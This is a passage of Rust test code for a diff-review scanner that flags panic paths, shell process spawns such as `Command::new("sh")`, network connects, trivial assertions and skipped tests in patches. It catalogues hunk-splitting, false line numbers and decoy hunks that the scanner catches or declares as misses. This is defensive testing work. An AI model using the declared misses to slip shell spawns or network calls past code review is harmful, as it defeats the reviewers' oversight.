        (S::TestRemoved, false, "# [ rstest ] fn t ( ) { }"),
        (
            S::TestRemoved,
            false,
            "# [ tokio :: test ( flavor = x ) ] async fn t ( ) { }",
        ),
    ];

    /// Every construct the token reader knows, cut in two between any two of its tokens
    /// and written as two hunks with a blank line of context between the halves (the eighth
    /// independent review's enumeration, IR8-M-3: 28 constructs, 265 cuts).
    ///
    /// - **With true numbers every cut is read.** The hunks touch, the join reads them as one
    ///   text, and the construct is found wherever it was cut. One true number is enough
    ///   (either one).
    /// - **With both numbers of the second hunk false nothing joins them**, and the construct
    ///   is found where one half holds a construct whole (the cut is outside it: `x.unwrap()`
    ///   and then `;`; `reqwest::` is the release's key by itself, `process::Command` is one
    ///   without `::new`, `::unwrap(x)` is a path call, `assert!(true,` is the assertion
    ///   whatever message follows), and nowhere else: a hunk side is read as text that ends
    ///   there, and nothing is inferred from how it ends. That is 173 of the 265, pinned
    ///   here so that a form read at an edge shows (round 16 read forms at the end of a
    ///   side and had 201; round 17 read one, a method's name and `::`, and had 178, the two
    ///   more being the cuts after `.unwrap ::` and `.unwrap :: <`; round 18 had 176, the
    ///   three more being a skip's attribute cut before its `]`: after `ignore =`, after
    ///   `ignore = why` and after the `cfg_attr` list's `)`, which round 19 reads only
    ///   whole). The other 92 are declared misses: a
    ///   cut straight after or before the bare word (`x.` / `unwrap()`, `x.unwrap` / `()`,
    ///   `Command` / `::new`, `todo` / `!()`), after a path's `::` (`Command::` / `new`),
    ///   after a stub's `!`, inside an assertion before the comma or bracket that ends its
    ///   truth, between `#`, `#[` or the attribute's name and what follows, inside a
    ///   `cfg_attr` list (also straight after its `ignore` or its `)`), a skip's attribute
    ///   anywhere before its `]`, after a method's name and its
    ///   `::` or `::<`, inside generic arguments, and a function passed as a value cut
    ///   before its name (`Option::` / `unwrap`). A construct cut twice, its word alone in a
    ///   hunk of its own, is one too (the review's `alone.patch`).
    #[test]
    fn a_cut_is_read_by_the_join_under_one_true_number_and_apart_only_where_a_half_is_whole() {
        let has = |patch: &str, signal: S| {
            file_evidence(&parse(patch).unwrap().remove(0))
                .iter()
                .any(|item| item.signal == signal)
        };
        let (mut cuts, mut found_apart) = (0, 0);
        for (signal, added, text) in CUT_CONSTRUCTS {
            let tokens: Vec<&str> = text.split(' ').collect();
            for cut in 1..tokens.len() {
                let (first, second) = (tokens[..cut].join(" "), tokens[cut..].join(" "));
                // the second hunk begins at old line 12 and new line 13 (added halves), or
                // at old line 13 and new line 12 (removed halves)
                let two = |old: u32, new: u32| {
                    if added {
                        format!(
                            "--- a/src/c.rs\n+++ b/src/c.rs\n@@ -10,2 +10,3 @@\n fn above() {{}}\n+    {first}\n \n@@ -{old},1 +{new},2 @@\n+    {second}\n fn below() {{}}\n"
                        )
                    } else {
                        format!(
                            "--- a/src/c.rs\n+++ b/src/c.rs\n@@ -10,3 +10,2 @@\n fn above() {{}}\n-    {first}\n \n@@ -{old},2 +{new},1 @@\n-    {second}\n fn below() {{}}\n"
                        )
                    }
                };
                let (old, new) = if added { (12, 13) } else { (13, 12) };
                for (what, patch) in [
                    ("true numbers", two(old, new)),
                    ("a false new number", two(old, new + 50)),
                    ("a false old number", two(old + 50, new)),
                ] {
                    assert!(
                        has(&patch, signal),
                        "{signal:?} of {first:?} and {second:?} with {what}"
                    );
                }
                cuts += 1;
                found_apart += usize::from(has(&two(old + 50, new + 70), signal));
            }
        }
        assert_eq!((cuts, found_apart), (265, 173));
    }

    /// The joins of round 14, by round 14's rule as it was written then (a small copy, to
    /// compare with): a hunk with no old line that is not the top goes after the last hunk
    /// so far that must end the file; then, in the order of the patch, a hunk goes after the
    /// first hunk of the patch that has old lines and ends before its old position, if
    /// nothing follows that one yet. The runs of more than one hunk: those Git must make,
    /// and those the positions add to them.
    fn joins_of_round_14(file: &ReviewFile) -> Vec<Vec<usize>> {
        let hunks = &file.patch_twin.hunks;
        let old_lines: Vec<u64> = hunks
            .iter()
            .map(|hunk| {
                hunk.lines
                    .iter()
                    .filter(|line| line.kind != PatchLineKind::Added)
                    .count() as u64
            })
            .collect();
        let top: Vec<bool> = (0..hunks.len())
            .map(|index| placed_at_top(file.status, &hunks[index], index == 0))
            .collect();
        let mut must: Vec<Option<usize>> = vec![None; hunks.len()];
        let mut followed = vec![false; hunks.len()];
        let mut ends_file = None;
        for (index, hunk) in hunks.iter().enumerate() {
            if old_lines[index] == 0
                && !top[index]
                && let Some(earlier) = ends_file
            {
                must[index] = Some(earlier);
                followed[earlier] = true;
            }
            if hunk
                .lines
                .last()
                .is_none_or(|line| line.kind != PatchLineKind::Context)
            {
                ends_file = Some(index);
            }
        }
        let mut ends_before = std::collections::HashMap::new();
        for (index, hunk) in hunks.iter().enumerate() {
            if let Some(start) = hunk.old_start
                && old_lines[index] > 0
            {
                ends_before
                    .entry(u64::from(start) + old_lines[index])
                    .or_insert(index);
            }
        }
        let mut before = must.clone();
        for (index, hunk) in hunks.iter().enumerate() {
            let (None, false, Some(start)) = (before[index], top[index], hunk.old_start) else {
                continue;
            };
            let position = u64::from(start) + u64::from(old_lines[index] == 0);
            if let Some(&earlier) = ends_before.get(&position)
                && earlier != index
                && !followed[earlier]
            {
                before[index] = Some(earlier);
                followed[earlier] = true;
            }
        }
        let runs = |before: &[Option<usize>]| {
            let mut after = vec![None; hunks.len()];
            for (index, earlier) in before.iter().enumerate() {
                if let Some(earlier) = earlier {
                    after[*earlier] = Some(index);
                }
            }
            (0..hunks.len())
                .filter(|index| before[*index].is_none())
                .map(|start| {
                    std::iter::successors(Some(start), |index| after[*index]).collect::<Vec<_>>()
                })
                .filter(|run| run.len() > 1)
                .collect::<Vec<_>>()
        };
        let mut out = runs(&must);
        for run in runs(&before) {
            if !out.contains(&run) {
                out.push(run);
            }
        }
        out
    }

    /// Eighth independent review, IR8-M-1: a hint that a later round added takes no join
    /// away that an earlier rule made. The review's patches, on its file `f.rs` (ten lines;
    /// lines 3 to 7 are `let d = c * 2;`, `debug_assert!(`, `a < b,`, the message, and
    /// `let e = d + 1;`), each checked there with plain `git apply --check -v`:
    ///
    /// - `decoy2.patch`: a hunk that changes the last line; `@@ -4,0 +60,1 @@` with one added
    ///   comment line (Git puts it at the end, after the first, whatever its numbers); and
    ///   two hunks that touch by their old numbers, the second with a false new number,
    ///   which turn the assertion into `debug_assert!(true, …)`. Round 14 joined the two and
    ///   reported the assertion. Round 15 let a hunk with no old line stand for the position
    ///   it names, kept one hunk for a position, the first of the patch, and so the comment
    ///   hunk took the place of the hunk that truly ends before line 5: nothing was
    ///   reported, and with `-20,0` for `-4,0`, a number Git never reads, it was.
    /// - `decoy.patch`: the comment hunk written first. It has no hunk to go after, and by
    ///   round 14's rule it then takes the place after the first of the two (it stands
    ///   "after line 4"); the second finds that place taken. Neither round found this one.
    ///   Now the two that have old lines are one text for plain Git, whatever a hunk with
    ///   none says, and by the numbers alone the three are one, the comment between.
    /// - `triple.patch`: the same with the three in the order of the file.
    /// - `selfshadow.patch`: a hunk with no old line written BEFORE the hunk it follows
    ///   found itself in the table and gave up.
    #[test]
    fn a_later_hint_takes_no_earlier_join_away() {
        let text = |hunks: &[usize]| Text {
            hunks: hunks.to_vec(),
            top: false,
        };
        let existing =
            |hunks: &str| unplaced(&format!("--- a/f.rs\n+++ b/f.rs\n{hunks}")).remove(0);
        let last = "@@ -10,1 +50,1 @@\n-fn main() { println!(\"{}\", check(1, 2)); }\n+fn main() { println!(\"{}\", check(1, 3)); }\n";
        let first =
            "@@ -3,2 +3,2 @@\n-    let d = c * 2;\n+    let d = c * 3;\n     debug_assert!(\n";
        let second = |new: u32| {
            format!(
                "@@ -5,3 +{new},3 @@\n-        a < b,\n+        true,\n         \"a must be below b\");\n     let e = d + 1;\n"
            )
        };
        let assertion = |line: u32| [(S::TrivialAssert, Basis::Hunk, line)];
        for decoy in ["@@ -4,0 +60,1 @@", "@@ -20,0 +60,1 @@"] {
            let file = existing(&format!("{last}{decoy}\n+// end\n{first}{}", second(30)));
            let all = texts(&file);
            assert!(all.contains(&text(&[2, 3])), "{decoy}: {all:?}");
            assert_eq!(found(&file), assertion(30), "{decoy}");
            for run in joins_of_round_14(&file) {
                assert!(all.iter().any(|text| text.hunks == run), "{decoy}: {run:?}");
            }
        }
        // `decoy.patch`
        let file = existing(&format!("@@ -4,0 +40,1 @@\n+// end\n{first}{}", second(30)));
        assert_eq!(
            texts(&file),
            [
                text(&[0]),
                text(&[1]),
                text(&[2]),
                // round 14's rule: the comment after the first of the two, the second alone
                text(&[1, 0]),
                // for plain Git, the two that have old lines, whatever a hunk with none says
                text(&[1, 2]),
                // and by the numbers alone, the three in the order of their positions
                text(&[1, 0, 2])
            ]
        );
        assert_eq!(found(&file), assertion(30));
        // `triple.patch`
        let file = existing(&format!(
            "{first}@@ -4,0 +70,1 @@\n+        // the condition\n{}",
            second(90)
        ));
        assert_eq!(
            texts(&file),
            [
                text(&[0]),
                text(&[1]),
                text(&[2]),
                text(&[0, 1]),
                text(&[0, 2]),
                text(&[0, 1, 2])
            ]
        );
        assert_eq!(found(&file), assertion(90));
        // and with code in the hunk of added lines, which read between the two would part
        // the assertion from its condition: the two are still read together
        let file = existing(&format!(
            "{first}@@ -4,0 +70,1 @@
+        x); check(
{}",
            second(90)
        ));
        assert_eq!(found(&file), assertion(90));
        // where no hunk with old lines ends before a position, a hunk with none stands for
        // it, and can be followed in its turn: three hunks of added lines at one old line
        let file = existing(
            "@@ -4,0 +40,1 @@
+    let v = opt.
@@ -4,0 +50,1 @@
+    unwrap
@@ -4,0 +60,1 @@
+    ();
",
        );
        assert_eq!(
            texts(&file),
            [text(&[0]), text(&[1]), text(&[2]), text(&[0, 1, 2])]
        );
        assert_eq!(found(&file), [(S::PanicPathAdded, Basis::Hunk, 40)]);
        // `selfshadow.patch`: the hunk with no old line stands after line 4, where the hunk
        // written after it ends. It is not its own predecessor.
        let file = existing(
            "@@ -4,0 +40,2 @@\n+        true ||\n+        a < b,\n@@ -3,2 +3,2 @@\n-    let d = c * 2;\n+    let d = c * 3;\n-    debug_assert!(\n+    assert!(\n",
        );
        let all = texts(&file);
        assert!(all.contains(&text(&[1, 0])), "{all:?}");
        // What stays, and is the declared way to part two hunks: two hunks that both have
        // old lines and both say they end before line 5, the false one written first. The
        // hunk at line 5 goes after the first of them.
        let file = existing(&format!(
            "@@ -3,2 +60,2 @@\n context\n-gone\n+here\n{first}{}",
            second(30)
        ));
        assert_eq!(
            texts(&file),
            [text(&[0]), text(&[1]), text(&[2]), text(&[0, 2])]
        );
        assert_eq!(found(&file), []);
    }

    /// What a scan holds in memory beside the patch: one reading of one text at a time, so
    /// never more lines than the longest text of the file has, however many texts a hunk
    /// stands in and however many readings a text has (ninth independent review, IR9-L-3
    /// and IR9-L-6: memory was stated as a factor measured on three shapes, the reviewer's
    /// shapes gave a larger one, and no test held anything). Counted by the readings
    /// themselves ([`view_lines_peak`]):
    ///
    /// - hunks apart: the lines of the longest hunk, not of the file;
    /// - the same hunks touching by true numbers, which are one text: all their lines, once
    ///   (the shape the reviewer measured at 2.6 times the release: every line of the file
    ///   is held a second time, for each side it is on);
    /// - a hunk that stands in several texts, and a Rust fragment that is read from several
    ///   starts: still the longest text, once.
    ///
    /// It counts the lines of the code views a reading holds, not memory: what else a
    /// reading might hold for a text (a copy of a view, a cache) is not counted here, and the
    /// memory figures of the README are measured, not held by this test (tenth independent
    /// review, its weak tests).
    #[test]
    fn a_scan_holds_one_reading_of_one_text_at_a_time() {
        let longest = |file: &ReviewFile| {
            texts(file)
                .iter()
                .map(|text| {
                    text.hunks
                        .iter()
                        .map(|index| file.patch_twin.hunks[*index].lines.len())
                        .sum::<usize>()
                })
                .max()
                .unwrap_or(0) as u64
        };
        let peak = |file: &ReviewFile| {
            let _ = view_lines_peak();
            let found = file_evidence(file).len();
            (view_lines_peak(), found)
        };
        let hunks = |path: &str, count: usize, step: usize, rows: usize, line: &str| {
            let mut patch = format!("--- a/{path}\n+++ b/{path}\n");
            for n in 0..count {
                let at = 2 + step * n;
                let _ = writeln!(patch, "@@ -{at},{rows} +{at},{rows} @@");
                for row in 0..rows - 1 {
                    let _ = writeln!(patch, " context {n} {row}");
                }
                let _ = writeln!(patch, "-old\n+{line}");
            }
            unplaced(&patch).remove(0)
        };
        for (path, line) in [
            ("src/a.rs", "    let s = \"open; x.unwrap();"),
            ("src/a.rs", "    x.unwrap();"),
            ("tools/a.py", "os.system(cmd)"),
        ] {
            // 200 hunks of 21 lines, 50 lines apart: nothing joins them
            let apart = hunks(path, 200, 50, 20, line);
            assert_eq!(joined_hunks(&apart), [false; 200]);
            assert_eq!(peak(&apart).0, 21, "{path} {line}");
            // the same hunks, each beginning where the last one ended: one text
            let touching = hunks(path, 200, 20, 20, line);
            assert_eq!(joined_hunks(&touching), [true; 200]);
            assert_eq!(longest(&touching), 200 * 21);
            let (held, found) = peak(&touching);
            assert_eq!(held, 200 * 21, "{path} {line}");
            assert!(
                found >= 200 || line.contains("open"),
                "{path} {line}: {found}"
            );
        }
        // a hunk in several texts (the review's `decoy.patch` shape: three joined texts)
        let several = unplaced(
            "--- a/f.rs\n+++ b/f.rs\n@@ -4,0 +40,1 @@\n+// end\n@@ -3,2 +3,2 @@\n-    let d = c * 2;\n+    let d = c * 3;\n     debug_assert!(\n@@ -5,3 +30,3 @@\n-        a < b,\n+        true,\n         \"a must be below b\");\n     let e = d + 1;\n",
        )
        .remove(0);
        assert_eq!(texts(&several).len(), 6);
        assert_eq!((longest(&several), peak(&several).0), (8, 8));
    }

    /// A hunk is not put after the end of the run it begins, and the next hunk that ends
    /// before its place is taken instead. Here the first hunk written (old lines 10 and 11)
    /// goes after the third, a hunk of added lines that says it stands after line 9; Git
    /// must put that third after the second, which ends the file and begins at line 12. So
    /// the second begins a run that the first ends, and the first says it ends before line
    /// 12: it is passed over, and the fourth, which says the same, is taken.
    #[test]
    fn the_end_of_the_run_a_hunk_begins_is_not_put_before_it() {
        let file = unplaced(
            "--- a/src/r.rs\n+++ b/src/r.rs\n@@ -10,2 +10,2 @@\n-a\n+b\n c\n@@ -12,1 +12,1 @@\n-d\n+e\n@@ -9,0 +90,1 @@\n+f\n@@ -10,2 +70,2 @@\n-g\n+h\n i\n",
        )
        .remove(0);
        let runs: Vec<Vec<usize>> = joined_texts(&file)
            .into_iter()
            .map(|text| text.hunks)
            .collect();
        assert!(runs.contains(&vec![3, 1, 2, 0]), "{runs:?}");
        for run in &runs {
            let mut hunks = run.clone();
            hunks.sort_unstable();
            hunks.dedup();
            assert_eq!(hunks.len(), run.len(), "{run:?}");
        }
    }

    /// What the joins do not see and the documents declare, pinned so that a change to it
    /// shows (ninth independent review, IR9-M-1 and IR9-L-4; each needs a writer who sets
    /// out to, and none is lower than release 0.8.3, which joins nothing).
    ///
    /// - **Hunks at the top.** A hunk whose old position is 0, or is 1 and that holds an old
    ///   line, is the top of its file to the reader, follows nothing and is read from the
    ///   start of a file only. `git apply --unidiff-zero` 2.56.0 puts every hunk at old
    ///   position 0 at line 1, the one written later ABOVE the one written earlier, and a
    ///   hunk at old position 1 under them (run in a scratch repository: `twotop.patch`,
    ///   "Hunk #1 succeeded at 1 (offset -2 lines)", and `topone.patch`, whose every number
    ///   is true, "Applied patch m.rs cleanly"; plain `git apply` refuses both). So
    ///   `opt.unwrap` and `()` stand together in the result, and nothing here reads them
    ///   together. A reading that did would be one more family of joins; it is declared
    ///   instead, as the hunk that an applier puts inside another is.
    /// - **A created file in several hunks at old position 0** (tenth independent review,
    ///   IR10-L-1): `--unidiff-zero` stacks them the same way, the later one above, where
    ///   the reader joins a created file's hunks in the order written.
    /// - **The mirror of the declared decoy.** Two hunks touch by a true number, and a third
    ///   that has lines on that side says falsely that it BEGINS at the line where they
    ///   touch, written between them: the first goes before the first hunk of the patch
    ///   that says it begins there (`mirror.patch`; Git: "Hunk #2 succeeded at 7 (offset 3
    ///   lines)"). Written after both, the third takes nothing.
    #[test]
    fn what_the_joins_do_not_see_is_what_the_documents_declare() {
        let text = |hunks: &[usize], top: bool| Text {
            hunks: hunks.to_vec(),
            top,
        };
        let existing =
            |hunks: &str| unplaced(&format!("--- a/m.rs\n+++ b/m.rs\n{hunks}")).remove(0);
        // `twotop.patch`
        let twotop = existing(
            "@@ -0,0 +3,2 @@\n+    ()\n+}\n@@ -0,0 +1,2 @@\n+pub fn boom(opt: Option<u8>) -> u8 {\n+    opt.unwrap\n",
        );
        assert_eq!(texts(&twotop), [text(&[0], true), text(&[1], true)]);
        assert_eq!(found(&twotop), []);
        // `topone.patch`
        let topone = existing(
            "@@ -0,0 +1,2 @@\n+pub fn boom(opt: Option<u8>) -> u8 {\n+    opt.unwrap\n@@ -1,1 +3,3 @@\n+    ()\n+}\n fn main() {\n",
        );
        assert_eq!(texts(&topone), [text(&[0], true), text(&[1], true)]);
        assert_eq!(found(&topone), []);
        // the same four lines with a second hunk that is no top are read together
        let topthen = existing(
            "@@ -0,0 +1,2 @@\n+pub fn boom(opt: Option<u8>) -> u8 {\n+    opt.unwrap\n@@ -1,0 +3,2 @@\n+    ()\n+}\n",
        );
        assert_eq!(found(&topthen), [(S::PanicPathAdded, Basis::Hunk, 2)]);
        // `mirror.patch` and its control
        let mirror = |decoy: &str, order: [usize; 3]| {
            let hunks = [
                "@@ -2,2 +2,2 @@\n-    let _unused = 0;\n+    let _used = 0;\n     debug_assert!(\n".to_owned(),
                format!("{decoy}\n-    let z = 3;\n+    let z = 4;\n     let w = 5;\n"),
                "@@ -4,2 +4,2 @@\n-        a < b,\n+        true,\n         \"a must be below b\"\n".to_owned(),
            ];
            existing(&order.map(|at| hunks[at].as_str()).concat())
        };
        let assertion = [(S::TrivialAssert, Basis::Hunk, 4)];
        // the decoy between the two, claiming the line they touch at: declared
        assert_eq!(found(&mirror("@@ -4,2 +4,2 @@", [0, 1, 2])), []);
        // with its true numbers, and written after the two with its false ones: found
        assert_eq!(found(&mirror("@@ -7,2 +7,2 @@", [0, 1, 2])), assertion);
        assert_eq!(found(&mirror("@@ -4,2 +4,2 @@", [0, 2, 1])), assertion);
        // a created file in several hunks at old position 0 (tenth independent review,
        // IR10-L-1): `git apply --unidiff-zero` puts the later hunk ABOVE the earlier one
        // (plain `git apply` refuses), and the reader joins them in the order written. So
        // `newtwotop.patch` (Git's result holds `opt.unwrap` / `()`, compiles and panics) is
        // a declared miss, and `newtop-natural.patch` (Git's result has no call) a declared
        // false positive.
        let created = |hunks: &str| {
            unplaced(&format!(
                "diff --git a/m.rs b/m.rs\nnew file mode 100644\n--- /dev/null\n+++ b/m.rs\n{hunks}"
            ))
            .remove(0)
        };
        let newtwotop = created(
            "@@ -0,0 +3,3 @@\n+    ()\n+}\n+fn main() { boom(None); }\n@@ -0,0 +1,2 @@\n+pub fn boom(opt: Option<u8>) -> u8 {\n+    opt.unwrap\n",
        );
        assert_eq!(found(&newtwotop), []);
        let natural = created(
            "@@ -0,0 +1,2 @@\n+pub fn boom(opt: Option<u8>) -> u8 {\n+    opt.unwrap\n@@ -0,0 +3,3 @@\n+    ()\n+}\n+fn main() { boom(None); }\n",
        );
        assert_eq!(found(&natural), [(S::PanicPathAdded, Basis::Hunk, 2)]);
    }

    /// The same as a property (IR8-M-1): over generated sections of two to six hunks with
    /// every kind of number, true and false, in any order, with hunks that have no line on a
    /// side among them, each run that round 14's rule makes ([`joins_of_round_14`]) is a
    /// text now, hunk for hunk. And what a set of joins must be whatever the numbers: no
    /// hunk twice in a text, no text made twice, and a hunk in at most six joined texts
    /// (seven with the hunk alone: the bound of [`joined_texts`]).
    #[test]
    fn every_join_of_round_14_is_a_text_whatever_else_the_numbers_say() {
        const BODIES: [&str; 6] = [
            " c\n+a\n c\n",
            "+a\n",
            "-r\n",
            " c\n-r\n+a\n",
            "-r\n+a\n c\n",
            "+a\n+b\n",
        ];
        let mut seed = 0x2026_1115_0008_u64;
        let mut next = move || {
            seed = seed
                .wrapping_mul(6_364_136_223_846_793_005)
                .wrapping_add(1_442_695_040_888_963_407);
            (seed >> 33) as usize
        };
        let (mut made, mut more) = (0, 0);
        for case in 0..40_000 {
            let mut patch = "--- a/src/g.rs\n+++ b/src/g.rs\n".to_owned();
            for _ in 0..2 + next() % 5 {
                let body = BODIES[next() % BODIES.len()];
                let old = body.lines().filter(|line| !line.starts_with('+')).count();
                let new = body.lines().filter(|line| !line.starts_with('-')).count();
                // few positions, so that hunks name the same ones; now and then one far off
                let mut number = || {
                    if next() % 8 == 0 {
                        40 + next() % 3
                    } else {
                        next() % 9
                    }
                };
                let (at_old, at_new) = (number(), number());
                let _ = write!(patch, "@@ -{at_old},{old} +{at_new},{new} @@\n{body}");
            }
            let file = unplaced(&patch).remove(0);
            let now = joined_texts(&file);
            let then = joins_of_round_14(&file);
            for run in &then {
                assert!(
                    now.iter().any(|text| text.hunks == *run),
                    "case {case}: {run:?} of\n{patch}"
                );
            }
            made += usize::from(!then.is_empty());
            more += usize::from(now.len() > then.len());
            for (place, text) in now.iter().enumerate() {
                let mut hunks = text.hunks.clone();
                hunks.sort_unstable();
                hunks.dedup();
                assert_eq!(hunks.len(), text.hunks.len(), "case {case}: {text:?}");
                assert!(text.hunks.len() > 1, "case {case}");
                assert!(!now[..place].contains(text), "case {case}: {text:?} twice");
            }
            for index in 0..file.patch_twin.hunks.len() {
                let stands_in = now
                    .iter()
                    .filter(|text| text.hunks.contains(&index))
                    .count();
                assert!(
                    stands_in <= 6,
                    "case {case}: hunk {index} in {stands_in}\n{patch}"
                );
            }
        }
        // the cases are of the kind that matters
        assert!(made > 20_000 && more > 10_000, "{made} {more}");
    }

    /// A side that began inside a raw string opened with several `#` is read to the quote
    /// that truly ends it, whatever quotes its text holds (seventh independent review,
    /// IR7-M-1: the review's `html.patch`, the plain output of `git diff` for a test whose
    /// page is a raw string opened with `r##"`; the first quote with a `#` after it is in
    /// `href="#top"`, round 13 and round 14 ended the string there and lost both panic
    /// paths, and release 0.8.3 never had that signal). The quote that ends the string has
    /// more `#` after it than any quote before it, and the side is read for each such
    /// record.
    #[test]
    fn a_raw_string_ends_at_a_quote_that_sets_a_record_of_hashes() {
        assert_eq!(
            quote_hash_records(&["plain", "a \"quote\" and # apart"]),
            []
        );
        assert_eq!(quote_hash_records(&["<a href=\"#top\">", "\"##;"]), [1, 2]);
        assert_eq!(quote_hash_records(&["\"## \"# \"###", "\"####"]), [2, 3, 4]);
        // no more than the bound, lowest first
        assert_eq!(
            quote_hash_records(&["\"# \"## \"### \"#### \"##### \"######"]),
            [1, 2, 3, 4]
        );
        let html = "diff --git a/tests/page.rs b/tests/page.rs\n--- a/tests/page.rs\n+++ b/tests/page.rs\n@@ -11,6 +11,7 @@ fn links_are_counted() {\n <a href=\"#top\">Top</a>\n <a href=\"https://example.com/docs\">Docs</a>\n \"##;\n-    let n = parse(html);\n-    assert!(n.is_ok());\n+    let n = parse(html).unwrap();\n+    let out = std::process::Command::new(\"true\").status().unwrap();\n+    assert!(n > 0 && out.success());\n }\n";
        assert_eq!(
            found_in(html),
            [
                (S::PanicPathAdded, Basis::Lexical, 14),
                (S::ProcessSpawn, Basis::Lexical, 15),
                (S::PanicPathAdded, Basis::Lexical, 15),
            ]
        );
        // The bound. A page in a raw string whose text holds quotes with one, two and three
        // `#`, and a link, ended by a quote with four: the fourth record, and the call after
        // it is found. One more level (quotes with up to four `#` in the text, ended by five)
        // is past the readings: the declared miss. (No other reading has that call: read
        // from code or from inside an ordinary string, the link's `//` and the last quote
        // leave the added line inside a string.)
        let page = |inner: &str, end: &str| {
            format!(
                "--- a/tests/deep.rs\n+++ b/tests/deep.rs\n@@ -20,4 +20,5 @@\n <a href=\"#a\"> \"## \"###{inner}\n <a href=\"https://example.com/docs\">Docs</a>\n \"{end};\n+    let n = load().unwrap();\n }}\n"
            )
        };
        assert_eq!(
            found_in(&page("", "####")),
            [(S::PanicPathAdded, Basis::Lexical, 23)]
        );
        assert_eq!(found_in(&page(" \"####", "#####")), []);
    }

    /// A construct cut in two by hunks that nothing joins (seventh independent review, the
    /// declared limit `cutpair.patch`: two hunks that touch while the second's position says
    /// they do not; plain `git apply --check -v`: rc 0 and no offset line; rustc compiles
    /// the result). One true number joins the two. With both numbers false nothing does,
    /// and the construct is found only where one half holds it whole: a hunk side is read
    /// as text that ends there, and nothing is inferred from how it ends. Rounds 15 to 17
    /// read forms at the end of a side, each time on an argument (no honest line ends so;
    /// every continuation the grammar allows is the construct), and each time a reviewer
    /// wrote the honest line:
    ///
    /// - round 15 a bare `Command` (`pub fn command() -> Command`, Vesper, VD3R15-M-1);
    /// - round 16 `Command::` (`const X: u8 = Command::` and `VERSION;`, Vesper,
    ///   VD3R16-M-1), and `assert!(true` (rustfmt's layout of a long condition that begins
    ///   with `true`, ninth independent review, IR9-M-2), and `todo!` (the end of a
    ///   sentence in a comment the hunk does not open, IR9-L-5);
    /// - round 17 `.unwrap::` and `.expect::<` (in a macro that takes any tokens it goes on as
    ///   `NOT_A_CALL` and the program compiles: Vesper, VD3R17-M-1; after a range `unwrap` is
    ///   a free function: tenth independent review, IR10-L-3).
    ///
    /// So a stub cut after `todo!`, a spawn cut after `Command::`, an assertion cut after
    /// its `true`, an attribute cut after its name and a method call cut after its `::` are
    /// declared misses behind two false numbers, as a call cut after `.unwrap` is; each
    /// takes a writer who sets out to.
    #[test]
    fn a_construct_cut_by_hunks_that_nothing_joins_is_found_only_where_a_half_holds_it_whole() {
        let existing =
            |hunks: &str| unplaced(&format!("--- a/cut.rs\n+++ b/cut.rs\n{hunks}")).remove(0);
        let pair = |first: &str, second: &str, header: &str| {
            existing(&format!(
                "@@ -1,2 +1,3 @@\n fn f(opt: Option<u32>) -> u32 {{\n+{first}\n \n{header}\n+{second}\n     a\n }}\n"
            ))
        };
        let apart = "@@ -40,2 +50,3 @@";
        let numbers = ["@@ -3,2 +4,3 @@", "@@ -40,2 +4,3 @@", "@@ -3,2 +50,3 @@"];
        // the call: found by the join when a number is true, and not when both are false
        let call = [(S::PanicPathAdded, Basis::Hunk, 2)];
        for header in numbers {
            assert_eq!(
                found(&pair("    let v = opt.unwrap", "    ();", header)),
                call
            );
        }
        assert_eq!(found(&pair("    let v = opt.unwrap", "    ();", apart)), []);
        assert_eq!(found(&pair("    let v = opt.", "    unwrap();", apart)), []);
        // what rounds 15 to 17 read there and is no evidence: each is found by the join
        // under one true number, and not behind two false ones
        for first in ["    let v = opt.unwrap::", "    let v = opt.expect::<"] {
            let second = if first.ends_with('<') {
                "    u8>(m);"
            } else {
                "    <u8>();"
            };
            for header in numbers {
                assert_eq!(
                    found(&pair(first, second, header)),
                    call,
                    "{first} {header}"
                );
            }
            assert_eq!(found(&pair(first, second, apart)), [], "{first}");
        }
        for (first, second, signal) in [
            ("    todo!", "    ();", S::StubAdded),
            (
                "    let c = std::process::Command::",
                "    new(\"sh\");",
                S::ProcessSpawn,
            ),
            ("    let c = Command::", "    new(\"sh\");", S::ProcessSpawn),
            (
                "    let s = TcpStream::",
                "    connect(a);",
                S::NetworkFetch,
            ),
            ("#[ignore", "]", S::TestSkipped),
            ("#[allow", "(dead_code)]", S::CheckSuppressed),
            ("    assert!(true", "    );", S::TrivialAssert),
            ("    let c = Command", "    ::new(\"sh\");", S::ProcessSpawn),
            (
                "    let s = TcpStream",
                "    ::connect(a);",
                S::NetworkFetch,
            ),
            ("    let rest = todo", "    !();", S::StubAdded),
            ("    assert", "    !(true);", S::TrivialAssert),
        ] {
            for header in numbers {
                assert_eq!(
                    found(&pair(first, second, header)),
                    [(signal, Basis::Hunk, 2)],
                    "{first} {header}"
                );
            }
            // `std::process::Command` is a construct whole in the first half
            let whole = if first.contains("process::Command") {
                vec![(signal, Basis::Lexical, 2)]
            } else {
                vec![]
            };
            assert_eq!(found(&pair(first, second, apart)), whole, "{first}");
        }
        // The reviewers' patches, each as `git diff -U0` wrote it, each in a file that has
        // no such construct. Vesper, round 15: a return type named `Command`.
        let honest = existing(
            "@@ -3 +3 @@ struct Command;\n-fn command() -> Command\n+pub fn command() -> Command\n",
        );
        assert_eq!(found(&honest), []);
        // Vesper, round 16 (`command-colon.patch`): a constant of a type named `Command`,
        // the path going on on the next line
        let honest = existing(
            "@@ -7 +7 @@ impl Command { const VERSION: u8 = 1; }\n-const X: u8 = Other::\n+const X: u8 = Command::\n",
        );
        assert_eq!(found(&honest), []);
        // Ninth independent review (`asserttrue-u0.patch`): rustfmt's layout of
        // `assert!(true && "…".len() > limit)`, the operator line unchanged
        let honest = existing(
            "@@ -2,2 +2,2 @@ pub fn check(limit: usize) {\n-    debug_assert!(\n-        cfg!(debug_assertions)\n+    assert!(\n+        true\n",
        );
        assert_eq!(found(&honest), []);
        // and its `prose.patch`: a line of a block comment that the hunk does not open
        let honest = existing(
            "@@ -12 +12 @@\n- * The fast path is not written yet.\n+ * The fast path is still a todo!\n",
        );
        assert_eq!(found(&honest), []);
        // Vesper, round 17 (`macro-token-tree.patch`): in `discard! { … }`, a macro that
        // takes any tokens, `value.unwrap::` goes on as `NOT_A_CALL`; it compiles and calls
        // nothing
        let honest =
            existing("@@ -7 +7 @@ fn main() {\n-        value.other::\n+        value.unwrap::\n");
        assert_eq!(found(&honest), []);
        // tenth independent review (`range-u0.patch`): `let r = 0..unwrap::` and `<u8>();`,
        // a range whose end calls a free function named `unwrap`
        let honest = existing(
            "@@ -5 +5 @@ fn main() {\n-    let r = 1..unwrap::\n+    let r = 0..unwrap::\n",
        );
        assert_eq!(found(&honest), []);
    }

    /// `#[ignore(…)]` switches a test off where the lint `ill_formed_attribute_input` is
    /// allowed: the lint is deny by default, `[lints.rust] ill_formed_attribute_input =
    /// "allow"` in `Cargo.toml` allows it, and the test compiles and is ignored (tenth
